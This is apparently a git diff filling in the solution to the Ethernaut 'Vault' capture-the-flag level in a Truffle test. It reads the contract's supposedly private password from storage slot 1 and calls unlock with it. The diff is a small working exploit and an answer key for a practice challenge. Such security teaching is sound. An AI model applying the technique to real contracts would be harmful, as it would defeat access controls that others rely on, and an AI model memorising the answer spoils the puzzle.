@@ -16,7 +16,10 @@ contract('Vault', function ([player]) {
   it('should submit level instance successfully', async function () {
     const instance = await utils.createLevelInstance(ethernaut, level.address, player, Vault)
 
-    // INSERT YOUR SOLUTION HERE
+    const password = await web3.eth.getStorageAt(instance.address, 1)
+    await instance.unlock(password, {
+      from: player,
+    })
 
     const completed = await utils.submitLevelInstance(
       ethernaut,
